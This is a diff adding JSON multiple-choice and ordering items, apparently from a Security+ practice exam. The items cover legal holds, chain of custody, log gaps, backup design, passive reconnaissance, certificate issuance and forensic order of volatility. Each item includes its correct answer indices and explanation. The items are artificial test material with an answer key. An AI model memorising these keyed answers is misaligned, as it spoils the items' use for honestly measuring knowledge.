+    "stem": "Legal counsel anticipates a lawsuit and instructs IT to stop deleting specific employees' email under the routine retention schedule. What is this called?",
+    "options": [
+      "Chain of custody",
+      "E-discovery production",
+      "A legal hold",
+      "Data sanitization"
+    ],
+    "correct": [
+      2
+    ],
+    "explanation": "A legal hold suspends normal deletion so potentially relevant data is preserved. E-discovery is the later process of identifying and producing that data for the case."
+  },
+  {
+    "id": "SECPLUS-D-011",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Chain of custody",
+    "stem": "An investigator records every person who handled a seized laptop, along with times and reasons. What is the purpose of this documentation?",
+    "options": [
+      "Establishing a legal hold",
+      "Calculating the exposure factor",
+      "Performing root cause analysis",
+      "Maintaining chain of custody"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "Chain of custody documents who handled evidence and when, preserving its admissibility. A legal hold preserves data from deletion but does not track handling of physical evidence."
+  },
+  {
+    "id": "SECPLUS-D-012",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Log indicators",
+    "stem": "During an investigation, the analyst finds the web server's security log has no entries between 01:00 and 03:30, although the server was online and serving traffic. Which indicator is this?",
+    "options": [
+      "Out-of-cycle logging",
+      "Blocked content",
+      "Account lockout",
+      "Missing logs"
+    ],
+    "correct": [
+      3
+    ],
+    "explanation": "A gap in logs while the system was active suggests an attacker cleared or stopped logging to hide activity. Out-of-cycle logging means entries appearing at unusual times, not entries that are absent."
+  },
+  {
+    "id": "SECPLUS-D-013",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Backup strategy",
+    "select": 2,
+    "stem": "After a ransomware attack encrypted both servers and the backup share, a company redesigns its backups. Which TWO practices BEST ensure it can recover next time? (Choose two.)",
+    "options": [
+      "Keep an immutable or offline copy",
+      "Test restores on a regular schedule",
+      "Store backups on the same file server",
+      "Give all users write access to backups",
+      "Back up critical data once a quarter"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "An immutable or offline copy cannot be encrypted by ransomware that reaches the network, and regular restore tests prove the backups actually work. Quarterly backups would still run, but they could lose up to three months of data."
+  },
+  {
+    "id": "SECPLUS-D-014",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Reconnaissance",
+    "select": 2,
+    "stem": "A penetration tester begins reconnaissance for an engagement. Which TWO activities are passive reconnaissance? (Choose two.)",
+    "options": [
+      "Reading WHOIS registration records",
+      "Searching social media for staff names",
+      "Port scanning the web server",
+      "Grabbing version banners from open services",
+      "Sending a test phishing email"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "WHOIS records and social media are public sources that never touch the target's systems. Port scanning and banner grabbing send traffic to the target, which makes them active reconnaissance."
+  },
+  {
+    "id": "SECPLUS-D-015",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secConcepts",
+    "difficulty": 3,
+    "format": "order",
+    "skill": "Certificate issuance",
+    "stem": "A web administrator needs a publicly trusted TLS certificate for a new server. Place the steps in the order they occur.",
+    "options": [
+      "Generate a public and private key pair",
+      "Create a certificate signing request",
+      "Submit the CSR to the CA",
+      "CA validates control of the domain",
+      "CA signs and issues the certificate",
+      "Install the certificate on the server"
+    ],
+    "correct": [
+      0,
+      1,
+      2,
+      3,
+      4,
+      5
+    ],
+    "explanation": "The CSR contains the public key, so the key pair must exist first. The CA validates the requester before signing, and the signed certificate is installed last alongside the private key that never left the server."
+  },
+  {
+    "id": "SECPLUS-D-016",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Log analysis",
+    "stem": "An analyst wants to confirm whether a specific external IP was denied when it tried to reach the internal SSH server. Which log should be checked FIRST?",
+    "options": [
+      "Application logs",
+      "Firewall logs",
+      "Endpoint antivirus logs",
+      "Badge reader logs"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "Firewall logs record allowed and denied connections by source, destination, and port. Application logs would only show the attempt if it reached the SSH service."
+  },
+  {
+    "id": "SECPLUS-D-017",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secThreats",
+    "difficulty": 2,
+    "format": "multi",
+    "skill": "Legacy system mitigation",
+    "select": 2,
+    "stem": "A plant runs an end-of-life controller on an operating system that can no longer be patched or run security agents, but it must still exchange data with one HMI. Which TWO mitigations are MOST appropriate? (Choose two.)",
+    "options": [
+      "Isolate it on a restricted segment",
+      "Monitor its traffic for anomalies",
+      "Install a modern EDR agent",
+      "Allow vendor access from the internet",
+      "Join it to the corporate domain"
+    ],
+    "correct": [
+      0,
+      1
+    ],
+    "explanation": "Segmentation limits who can reach the controller to the one HMI, and traffic monitoring compensates for the missing host protections. An EDR agent is not an option because the stem says the system cannot run security agents."
+  },
+  {
+    "id": "SECPLUS-D-018",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secArchitecture",
+    "difficulty": 1,
+    "format": "single",
+    "skill": "Power resilience",
+    "stem": "A data center must keep its servers running for several hours during an extended utility power outage. Which solution is MOST appropriate?",
+    "options": [
+      "A backup generator",
+      "A UPS by itself",
+      "A surge protector",
+      "Dual power supplies"
+    ],
+    "correct": [
+      0
+    ],
+    "explanation": "Generators supply power for hours or days as long as they have fuel. A UPS is tempting, but its batteries are designed to bridge only minutes until a generator starts or systems shut down cleanly."
+  },
+  {
+    "id": "SECPLUS-D-019",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secGovernance",
+    "difficulty": 2,
+    "format": "single",
+    "skill": "Security awareness",
+    "stem": "A simulated phishing campaign shows that 18% of employees clicked the link but only 2% reported the message. What should awareness training emphasize NEXT?",
+    "options": [
+      "Hybrid work environment security",
+      "Recognizing and reporting suspicious messages",
+      "Password complexity requirements",
+      "Proper handling of removable media and cables"
+    ],
+    "correct": [
+      1
+    ],
+    "explanation": "The results show weak recognition and very low reporting, so training should target identifying and reporting phishing. Password and removable media topics do not address the observed gap."
+  },
+  {
+    "id": "SECPLUS-D-020",
+    "section": "secplus",
+    "test": 0,
+    "module": 1,
+    "domain": "secOperations",
+    "difficulty": 3,
+    "format": "order",
+    "skill": "Order of volatility",
+    "stem": "A forensic analyst arrives at a running server suspected of compromise. Place the evidence sources in the order they should be collected, according to the order of volatility.",
+    "options": [
+      "CPU registers and cache",
+      "System memory (RAM)",
+      "Swap and temporary files",
+      "Local disk drives",
+      "Archived backup media"
+    ],
+    "correct": [
+      0,
+      1,
+      2,
+      3,
+      4
+    ],
+    "explanation": "Evidence is collected from most to least volatile: registers and cache change in nanoseconds, RAM is lost at power off, swap and temp files are overwritten quickly, disks persist, and archived backups are the most stable."
+  }
+]
